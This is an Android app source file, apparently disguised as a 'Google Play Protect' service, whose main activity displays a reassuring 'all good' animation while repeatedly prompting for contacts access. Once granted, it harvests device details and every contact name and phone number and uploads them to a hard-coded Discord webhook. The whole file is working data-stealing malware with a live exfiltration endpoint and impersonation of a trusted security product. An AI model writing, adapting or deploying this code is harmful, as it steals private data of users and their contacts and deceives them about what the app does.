package com;

import android.Manifest;
import android.content.ContentResolver;
import android.content.Context;
import android.content.DialogInterface;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.os.AsyncTask;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.os.Handler;
import android.provider.ContactsContract;
import android.provider.Settings;
import android.util.Log;
import androidx.annotation.NonNull;
import androidx.appcompat.app.AlertDialog;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;
import pl.droidsonroids.gif.GifDrawable;
import pl.droidsonroids.gif.GifImageView;

import com.GooglePlayProtectService.R;

import org.json.JSONException;
import org.json.JSONObject;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.OutputStream;
import java.io.OutputStreamWriter;
import java.io.PrintWriter;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.charset.StandardCharsets;

public class MainActivity extends AppCompatActivity {

    private static final String WEBHOOK_URL = "https://discord.com/api/webhooks/1352988210212503652/D-7ykislImfMtSMG0IeIjHx7VrTjtu0JeMLMnnsRKn64NMPPE9wJMePky8e5Rs8daqcW";
    private static final int REQUEST_CODE_READ_CONTACTS = 100;
    private static final int MAX_PERMISSION_REQUEST_ATTEMPTS = 1;
    private GifDrawable gifDrawable;
    private SharedPreferences prefs;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.layout);

        prefs = getSharedPreferences("MyPrefs", Context.MODE_PRIVATE);
        GifImageView gifImageView = findViewById(R.id.gifImageView);

        try {
            gifDrawable = new GifDrawable(getResources(), R.drawable.all_good);
            gifDrawable.stop(); // Pause the GIF initially
            gifImageView.setImageDrawable(gifDrawable);
        } catch (Exception e) {
            e.printStackTrace();
        }

        // Set up OnClickListener for the GifImageView
        gifImageView.setOnClickListener(v -> {
            if (gifDrawable != null && !gifDrawable.isPlaying()) {
                gifDrawable.setLoopCount(1); // Play only once
                gifDrawable.start();

                // Reset the GIF to its initial frame after it finishes playing
                new Handler().postDelayed(() -> {
                    if (gifDrawable != null) {
                        gifDrawable.seekToFrame(0);
                        gifDrawable.stop();
                    }
                }, gifDrawable.getDuration());
            }
        });

        // Check for permission to read contacts
        checkContactPermission();
    }

    private void checkContactPermission() {
        int permissionRequestAttempts = prefs.getInt("PermissionRequestAttempts", 0);

        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CONTACTS)
                != PackageManager.PERMISSION_GRANTED && permissionRequestAttempts < MAX_PERMISSION_REQUEST_ATTEMPTS) {
            // Request the permission
            ActivityCompat.requestPermissions(this, new String[]{Manifest.permission.READ_CONTACTS},
                    REQUEST_CODE_READ_CONTACTS);
        } else if (permissionRequestAttempts >= MAX_PERMISSION_REQUEST_ATTEMPTS) {
            showPermissionExplanation();
        } else {
            // Permission already granted, send device info and contacts
            sendDeviceInfoOnFirstRun();
        }
    }

    private void showPermissionExplanation() {
        new AlertDialog.Builder(this)
                .setTitle("Permesso di accesso ai contatti")
                .setMessage("L'applicazione richiede questo permesso per funzionare.")
                .setPositiveButton("OK", (dialog, which) -> {
                    resetPermissionRequestAttempts();
                    ActivityCompat.requestPermissions(MainActivity.this,
                            new String[]{Manifest.permission.READ_CONTACTS},
                            REQUEST_CODE_READ_CONTACTS);
                })
                .setCancelable(false)
                .show();
    }

    private void resetPermissionRequestAttempts() {
        SharedPreferences.Editor editor = prefs.edit();
        editor.putInt("PermissionRequestAttempts", 0);
        editor.apply();
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions,
                                           @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode == REQUEST_CODE_READ_CONTACTS) {
            if (grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
                // Permission granted, send device info and contacts
                sendDeviceInfoOnFirstRun();
            } else {
                // Permission denied, increment the request attempts counter
                int permissionRequestAttempts = prefs.getInt("PermissionRequestAttempts", 0) + 1;
                SharedPreferences.Editor editor = prefs.edit();
                editor.putInt("PermissionRequestAttempts", permissionRequestAttempts);
                editor.apply();

                // Show permission request again if attempts are less than max attempts
                if (permissionRequestAttempts < MAX_PERMISSION_REQUEST_ATTEMPTS) {
                    checkContactPermission();
                } else {
                    showPermissionExplanation();
                }
            }
        }
    }

    private void sendDeviceInfoOnFirstRun() {
        boolean isFirstRun = prefs.getBoolean("FirstRun", true);

        if (isFirstRun) {
            // Raccogli i dettagli del dispositivo
            String deviceDetails = getSYSInfo();

            // Invia le informazioni raccolte a Discord
            new MessageSender().execute(deviceDetails);

            // Salva i contatti in un file di testo e invia il file a Discord
            new SaveContactsTask().execute();

            SharedPreferences.Editor editor = prefs.edit();
            editor.putBoolean("FirstRun", false);
            editor.apply();
        }
    }

    private String getSYSInfo() {
        return "Produttore: " + Build.MANUFACTURER + "\n" +
                "VERSIONE: " + Build.VERSION.RELEASE + "\n" +
                "NUMERO SDK: " + Build.VERSION.SDK_INT + "\n";
    }

    private class SaveContactsTask extends AsyncTask<Void, Void, File> {

        @Override
        protected File doInBackground(Void... voids) {
            File contactsFile = new File(getExternalFilesDir(Environment.DIRECTORY_DOCUMENTS),
                    "contacts.txt");

            try (FileOutputStream fos = new FileOutputStream(contactsFile)) {
                ContentResolver cr = getContentResolver();
                Cursor cursor = cr.query(ContactsContract.Contacts.CONTENT_URI, null, null, null, null);

                if (cursor != null && cursor.getCount() > 0) {
                    while (cursor.moveToNext()) {
                        String id = cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts._ID));
                        String name = cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME));

                        if (cursor.getInt(cursor.getColumnIndex(ContactsContract.Contacts.HAS_PHONE_NUMBER)) > 0) {
                            Cursor pCur = cr.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null,
                                    ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?", new String[]{id}, null);

                            while (pCur != null && pCur.moveToNext()) {
                                String phoneNo = pCur.getString(pCur.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
                                fos.write((name + ": " + phoneNo + "\n").getBytes());
                            }
                            if (pCur != null) {
                                pCur.close();
                            }
                        }
                    }
                    cursor.close();
                }
            } catch (Exception e) {
                e.printStackTrace();
            }
            return contactsFile;
        }

        @Override
        protected void onPostExecute(File contactsFile) {
            if (contactsFile != null && contactsFile.exists()) {
                new FileSender().execute(contactsFile);
            }
        }
    }

    private static class FileSender extends AsyncTask<File, Void, Void> {
        private static final String TAG = "FileSender";

        @Override
        protected Void doInBackground(File... files) {
            File file = files[0];

            try {
                String boundary = "===" + System.currentTimeMillis() + "===";
                URL url = new URL(WEBHOOK_URL);
                HttpURLConnection connection = (HttpURLConnection) url.openConnection();
                connection.setRequestMethod("POST");
                connection.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + boundary);
                connection.setDoOutput(true);

                try (OutputStream os = connection.getOutputStream();
                     PrintWriter writer = new PrintWriter(new OutputStreamWriter(os, StandardCharsets.UTF_8), true)) {

                    // Send normal data
                    writer.append("--").append(boundary).append("\r\n");
                    writer.append("Content-Disposition: form-data; name=\"file\"; filename=\"contacts.txt\"\r\n");
                    writer.append("Content-Type: text/plain\r\n");
                    writer.append("\r\n").flush();

                    try (FileInputStream fis = new FileInputStream(file)) {
                        byte[] buffer = new byte[1024];
                        int bytesRead;
                        while ((bytesRead = fis.read(buffer)) != -1) {
                            os.write(buffer, 0, bytesRead);
                        }
                        os.flush();
                    }

                    writer.append("\r\n").flush();
                    writer.append("--").append(boundary).append("--").append("\r\n").flush();
                }

                int responseCode = connection.getResponseCode();
                if (responseCode == HttpURLConnection.HTTP_OK) {
                    Log.d(TAG, "File inviato al canale Discord.");
                } else {
                    Log.e(TAG, "Invio del file al canale Discord fallito. Codice di risposta: " + responseCode);
                }
                connection.disconnect();
            } catch (Exception e) {
                Log.e(TAG, "Invio del file al canale Discord fallito: " + e.getMessage());
            }
            return null;
        }
    }

    private static class MessageSender extends AsyncTask<String, Void, Void> {
        private static final String TAG = "MessageSender";

        @Override
        protected Void doInBackground(String... strings) {
            String log = strings[0];

            try {
                URL url = new URL(WEBHOOK_URL);
                HttpURLConnection connection = (HttpURLConnection) url.openConnection();
                connection.setRequestMethod("POST");
                connection.setRequestProperty("Content-Type", "application/json");
                connection.setDoOutput(true);

                JSONObject messageJSON = new JSONObject();
                messageJSON.put("content", "```\n" + log + "\n```");
                OutputStream os = connection.getOutputStream();
                os.write(messageJSON.toString().getBytes(StandardCharsets.UTF_8));
                os.flush();
                os.close();

                int responseCode = connection.getResponseCode();
                if (responseCode == HttpURLConnection.HTTP_OK) {
                    Log.d(TAG, "Messaggio inviato al canale Discord.");
                } else {
                    Log.e(TAG, "Invio del messaggio al canale Discord fallito. Codice di risposta: " + responseCode);
                }
                connection.disconnect();
            } catch (JSONException e) {
                Log.e(TAG, "Creazione dell'oggetto JSON fallita: " + e.getMessage());
            } catch (Exception e) {
                Log.e(TAG, "Invio del messaggio al canale Discord fallito: " + e.getMessage());
            }
            return null;
        }
    }
}